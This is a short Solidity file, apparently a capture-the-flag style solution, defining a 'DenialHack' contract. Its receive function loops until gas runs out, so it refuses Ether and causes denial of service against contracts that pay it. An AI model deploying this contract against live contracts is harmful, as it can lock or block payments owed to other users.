pragma solidity ^0.8.0;

contract DenialHack {
    receive() external payable {
        uint256 i;
        for (i = 0; i < 1000000000000000000000000; i++) {
            uint256 j = i * i;
        }
    }
}